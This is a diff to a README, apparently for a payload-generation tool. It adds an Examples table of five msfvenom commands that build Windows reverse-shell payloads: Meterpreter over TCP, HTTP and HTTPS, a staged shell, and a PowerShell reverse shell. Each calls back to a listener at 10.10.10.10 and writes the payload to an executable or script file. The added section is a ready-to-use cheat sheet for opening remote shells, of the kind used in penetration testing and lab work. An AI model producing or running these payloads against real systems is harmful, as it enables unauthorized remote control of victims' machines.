@@ -2,6 +2,7 @@
 
 - [Introduction](#introduction)
 - [Usage](#usage)
+- [Examples](#examples)
 
 ## Introduction
 
@@ -51,3 +52,16 @@ Options:
     -h, --help                       Show this message
 ```
 
+## Examples
+
+Below are some different payload commands. I have grouped them with a heading to help explain what the payload is for.
+
+### Windows Payloads
+
+| Description | Command |
+| --- | --- |
+| Windows Reverse TCP Meterpreter | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe` |
+| Windows Reverse HTTP Meterpreter | `msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=8080 -f exe > shell_http.exe` |
+| Windows Reverse HTTPS Meterpreter | `msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe > shell_https.exe` |
+| Windows Staged Reverse TCP | `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell_stage.exe` |
+| Windows Reverse TCP PowerShell | `msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.ps1` |
